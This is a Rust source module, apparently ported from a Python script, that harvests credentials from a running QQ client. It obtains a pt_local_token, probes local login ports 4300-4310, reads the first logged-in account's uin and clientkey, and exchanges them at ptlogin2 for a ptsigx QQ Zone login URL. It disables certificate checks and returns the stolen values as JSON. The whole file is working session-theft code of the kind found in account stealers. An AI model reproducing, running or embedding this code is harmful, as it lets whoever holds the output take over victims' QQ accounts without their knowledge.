//! QQ clientkey 提取 —— 完全对齐 `qq_ck_test.py` 脚本方法。
//!
//! 流程（与脚本一致）：
//!   1. 从 xlogin 获取 pt_local_token
//!   2. 探测本机 QQ 本地登录端口（4300..4310）
//!   3. pt_get_uins 取第一个已登录 uin
//!   4. pt_get_st 取该 uin 的 clientkey
//!   5. ptlogin2 jump 兑换，从响应提取 ptsigx（QQ 空间免登 URL）
//!
//! 不做 bkn/skey 计算，不做进程内存扫描（脚本未包含这些）。

use std::net::TcpStream;
use std::time::Duration;

pub struct QQClientKey;

const LOCAL_HOST: &str = "localhost.ptlogin2.qq.com";
const PORT_START: u16 = 4300;
const PORT_END: u16 = 4310;

const USER_AGENT: &str = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0 Safari/537.36";
const REFERER: &str = "https://xui.ptlogin2.qq.com/";

const XUI_LOGIN_URL: &str = "https://ssl.xui.ptlogin2.weiyun.com/cgi-bin/xlogin?appid=549000912&s_url=http%3A%2F%2Fptlogin2.weiyun.com%2Fjump%3Fclientuin%3Dempty%26keyindex%3D19&style=22&target=qq";
const JUMP_URL: &str = "https://ptlogin2.qq.com/jump";
const JUMP_TARGET_URL: &str = "https://qzs.qzone.qq.com/qzone/v5/loginsucc.html?para=izone";

impl QQClientKey {
    pub async fn collect() -> String {
        let session = match build_session() {
            Ok(c) => c,
            Err(e) => return json_error(&format!("client build failed: {e}")),
        };

        // [1] pt_local_token
        let token = match get_pt_local_token(&session).await {
            Some(t) => t,
            None => return json_error("no pt_local_token"),
        };

        // [2] probe local ports
        let ports = probe_local_ports();
        if ports.is_empty() {
            return json_error("no alive local qq ports");
        }

        // [3] pt_get_uins → first uin; [4] pt_get_st → clientkey
        for port in ports {
            let uins = match get_uins_on_port(&session, port, &token).await {
                Ok(u) => u,
                Err(_) => continue,
            };
            if uins.is_empty() {
                continue;
            }
            let uin = &uins[0];

            let clientkey = match get_clientkey_on_port(&session, port, uin, &token).await {
                Some(k) => k,
                None => continue,
            };

            // [5] jump → ptsigx URL（不计算 skey/bkn）
            let ptsigx = exchange_for_ptsigx(&token, uin, &clientkey).await;

            return serde_json::json!({
                "uin": uin,
                "clientkey": clientkey,
                "ptsigx": ptsigx,
            })
            .to_string();
        }

        json_error("no uin/clientkey returned from local ports")
    }
}

fn json_error(msg: &str) -> String {
    serde_json::json!({ "error": msg }).to_string()
}

fn build_session() -> Result<reqwest::Client, String> {
    reqwest::Client::builder()
        .timeout(Duration::from_secs(10))
        .danger_accept_invalid_certs(true)
        .user_agent(USER_AGENT)
        .default_headers({
            let mut h = reqwest::header::HeaderMap::new();
            h.insert(
                reqwest::header::REFERER,
                reqwest::header::HeaderValue::from_static(REFERER),
            );
            h
        })
        .build()
        .map_err(|e| e.to_string())
}

async fn get_pt_local_token(session: &reqwest::Client) -> Option<String> {
    let res = session.get(XUI_LOGIN_URL).send().await.ok()?;
    for cookie in res.cookies() {
        if cookie.name() == "pt_local_token" && !cookie.value().is_empty() {
            return Some(cookie.value().to_string());
        }
    }
    None
}

fn probe_local_ports() -> Vec<u16> {
    (PORT_START..=PORT_END)
        .filter(|&port| {
            TcpStream::connect_timeout(
                &format!("127.0.0.1:{port}").parse().unwrap(),
                Duration::from_millis(500),
            )
            .is_ok()
        })
        .collect()
}

async fn get_uins_on_port(
    session: &reqwest::Client,
    port: u16,
    token: &str,
) -> Result<Vec<String>, String> {
    let r = rand_frac();
    let url = format!(
        "https://{LOCAL_HOST}:{port}/pt_get_uins?callback=ptui_getuins_CB&r={r}&pt_local_tk={token}"
    );
    let res = session
        .get(&url)
        .header(reqwest::header::REFERER, REFERER)
        .header(reqwest::header::COOKIE, format!("pt_local_token={token}"))
        .send()
        .await
        .map_err(|e| e.to_string())?;
    let body = res.text().await.map_err(|e| e.to_string())?;

    let json = extract_regex_json(&body, r"var_sso_uin_list=(\[.*?\]);")
        .ok_or_else(|| format!("pt_get_uins: unexpected body: {}", &body.chars().take(200).collect::<String>()))?;
    let value: serde_json::Value = serde_json::from_str(&json).map_err(|e| e.to_string())?;

    // 脚本只取 uin_list[0]["uin"]
    let first_uin = value
        .as_array()
        .and_then(|arr| arr.first())
        .and_then(|item| item.get("uin"))
        .and_then(|u| u.as_str().map(String::from));
    Ok(first_uin.into_iter().collect())
}

async fn get_clientkey_on_port(
    session: &reqwest::Client,
    port: u16,
    uin: &str,
    token: &str,
) -> Option<String> {
    let r = rand_frac();
    let url = format!(
        "https://{LOCAL_HOST}:{port}/pt_get_st?clientuin={uin}&callback=ptui_getst_CB&r={r}&pt_local_tk={token}"
    );
    let res = session
        .get(&url)
        .header(reqwest::header::REFERER, REFERER)
        .header(reqwest::header::COOKIE, format!("pt_local_token={token}"))
        .send()
        .await
        .ok()?;
    let mut ck: Option<String> = None;
    for cookie in res.cookies() {
        if cookie.name() == "clientkey" && !cookie.value().is_empty() {
            ck = Some(cookie.value().to_string());
            break;
        }
    }
    ck
}

/// jump 兑换，仅提取 ptsigx（QQ 空间免登 URL），不计算 skey/bkn。
async fn exchange_for_ptsigx(token: &str, uin: &str, clientkey: &str) -> String {
    let client = match reqwest::Client::builder()
        .timeout(Duration::from_secs(10))
        .danger_accept_invalid_certs(true)
        .user_agent(USER_AGENT)
        .redirect(reqwest::redirect::Policy::none())
        .build()
    {
        Ok(c) => c,
        Err(_) => return String::new(),
    };

    let url = format!(
        "{JUMP_URL}?clientuin={uin}&keyindex=19&pt_aid=549000912&daid=5&u1={}&pt_local_tk={}&pt_3rd_aid=0&ptopt=1&style=40",
        urlencode(JUMP_TARGET_URL),
        urlencode(token)
    );

    let res = match client
        .get(&url)
        .header(
            reqwest::header::COOKIE,
            format!("clientuin={uin}; clientkey={clientkey}"),
        )
        .send()
        .await
    {
        Ok(r) => r,
        Err(_) => return String::new(),
    };

    let body = match res.text().await {
        Ok(b) => b,
        Err(_) => return String::new(),
    };

    // 脚本：re.search(r"check_sig\?([^'\s]+)", body) → https://ptlogin2.qzone.qq.com/check_sig?<unquote>
    extract_regex_json(&body, r"check_sig\?([^'\s]+)")
        .map(|q| format!("https://ptlogin2.qzone.qq.com/check_sig?{}", url_decode(&q)))
        .unwrap_or_default()
}

fn rand_frac() -> String {
    let n = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .map(|d| d.as_nanos() % 1_000_000_000)
        .unwrap_or(0);
    format!("0.{:09}", n)
}

fn extract_regex_json(body: &str, pattern: &str) -> Option<String> {
    let re = regex::Regex::new(pattern).ok()?;
    re.captures(body)
        .and_then(|c| c.get(1))
        .map(|m| m.as_str().to_string())
}

fn urlencode(s: &str) -> String {
    let mut out = String::with_capacity(s.len());
    for b in s.bytes() {
        match b {
            b'A'..=b'Z' | b'a'..=b'z' | b'0'..=b'9' | b'-' | b'_' | b'.' | b'~' => {
                out.push(b as char)
            }
            _ => out.push_str(&format!("%{b:02X}")),
        }
    }
    out
}

/// 对齐脚本的 urllib.parse.unquote。
fn url_decode(s: &str) -> String {
    let bytes = s.as_bytes();
    let mut out = Vec::with_capacity(bytes.len());
    let mut i = 0;
    while i < bytes.len() {
        if bytes[i] == b'%' && i + 2 < bytes.len() {
            if let (Some(h), Some(l)) = (hex_val(bytes[i + 1]), hex_val(bytes[i + 2])) {
                out.push((h << 4) | l);
                i += 3;
                continue;
            }
        }
        out.push(bytes[i]);
        i += 1;
    }
    String::from_utf8_lossy(&out).into_owned()
}

fn hex_val(b: u8) -> Option<u8> {
    match b {
        b'0'..=b'9' => Some(b - b'0'),
        b'a'..=b'f' => Some(b - b'a' + 10),
        b'A'..=b'F' => Some(b - b'A' + 10),
        _ => None,
    }
}
